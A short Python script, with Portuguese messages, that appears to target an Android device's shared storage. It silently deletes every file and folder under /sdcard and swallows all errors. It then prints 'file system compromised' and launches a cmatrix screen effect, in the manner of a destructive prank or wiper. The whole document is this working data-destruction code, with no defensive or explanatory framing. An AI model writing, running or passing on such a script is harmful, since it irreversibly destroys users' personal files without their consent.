import os
import shutil
import time

diretorio_sdcard = '/sdcard'

try:
    for filename in os.listdir(diretorio_sdcard):
        file_path = os.path.join(diretorio_sdcard, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            pass

    print("sistema de aquivos comprometidos")

    # 
    time.sleep(2.5)

    # 
    os.system('clear')

    # 
    os.system('cmatrix')

except Exception as e:
    pass
